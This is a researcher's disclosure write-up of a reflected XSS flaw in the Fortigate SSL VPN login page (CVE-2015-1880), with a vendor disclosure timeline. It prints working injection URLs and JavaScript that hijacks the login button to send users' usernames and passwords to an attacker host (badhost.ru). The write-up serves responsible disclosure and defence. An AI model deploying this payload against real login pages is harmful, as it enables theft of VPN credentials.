---
description: >-
  While evaluating VPN solutions for work, I found an XSS vulnerability in
  Fortigates SSL VPN login page that allowed me to steal credentials.
---

# XSS in Fortigates SSL VPN login page

_Originally Published: April 20th, 2015_

While evaluating a Fortigate VPN appliance, I noticed something weird about how it displayed errors on the login page.

![](https://www.psattack.com/webhook-uploads/1447717154611/fortigate_source.png)

It was rendering the value of the "err" parameter as a comment in the HTML.

#### Cross Site Scripting <a id="cross-site-scripting"></a>

Because Fortigate was rendering data directly from the web address into the webpage, there's the possibility for a cross site scripting vulnerability. Cross Site Scripting \(or XSS\) is where an attacker is able to make a webpage render HTML of their choosing. This attack is typically used to run malicious javascript which can be as simple as a popup message to something more dangerous like a browser exploit.

#### Proof of Concept <a id="proof-of-concept"></a>

Next step was to see if the err parameter could be manipulated so that I could put some javascript in the URL and have it render in the browser. To do this, we need to end the comment with "--&gt;", add our javascript, and to keep things clean we'll start a new comment string with "&lt;!--" to make sure we don't leave an open ended closing comment string that would render out to HTML.

So we end up with a URL like this:

```text
hxxps://vpn.example.com/remote/login?&err=--><script>alert(pop)</script><!--&lang=en
```

This results in the follow HTML being rendered:

![](https://www.psattack.com/webhook-uploads/1447717030867/fortigate_pop_source.png)

Which pops our alert:

![](https://www.psattack.com/webhook-uploads/1447717114987/fortigate_pop.png)

#### Doing some actual damage <a id="doing-some-actual-damage"></a>

So we can render javascript to the client. I wanted to see how far I could take this though, so I kept poking around. It turns out that when you click the "Login" button, instead of just posting the form it runs some javascript first. That's a pretty good place to start messing with things.

Let's adjust our URL so that instead of just popping a message, we load a javascript file from a "malicious webserver" that we control. Our new URL ends up looking like this:

```text
hxxps://vpn.example.com/remote/login?&err=--><script src="http://badhost.ru/r.js"></script><!--&lang=en
```

Putting this together, I wrote up the following javascript that when loaded, replaces the original javascript function for the login button. Now when a user enters their credentials, this new login function first sends the credentials to my website before passing them on the Fortigate appliance.

```text
function jah_login() {
    console.log("try_login run");
    var username = document.getElementById("username").value;
    var password = document.getElementById("credential").value;
    var url = "http://badhost.ru:5000/?user="+username+"&passwd="+password;
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url, false );
    xmlHttp.send();
    console.log("Data sent.");
    try_login();
}

function update_login(){
    document.getElementById("err_str").style.display = "none";
    document.getElementById("err_val").style.display = "none";
    document.getElementById("login_button").onclick = jah_login;
}

setInterval(update_login, 1000);
```

The end result is a link that you can send to a victim and then silently get their VPN credentials. Here's a video of the final payload in action with the VPN login page on the left and the malicious website that is stealing credentials on the right.

\(Note that because of the text in the video, it's best to view it full screen and in HD\)

#### Disclosure <a id="disclosure"></a>

01/29/2015 - Vulnerabilty sent to psirt@fortigate.com

02/11/2015 - Fortigate acknowledges receipt of notice and began looking into it.

02/17/2015 - Fortigate confirms that the following FortiOS's are vulnerable: FortiOS 5.2.0 GA , 5.2.1 GA , 5.2.2 GA. Fix coming in FortiOS 5.2.3

02/23/2015 - Fortigate reserves CVE-2015-1880 for the issue

04/20/2015 - Fortigate releases FortiOS 5.2.3 and issues [advisory](http://www.fortiguard.com/advisory/FG-IR-15-005/).

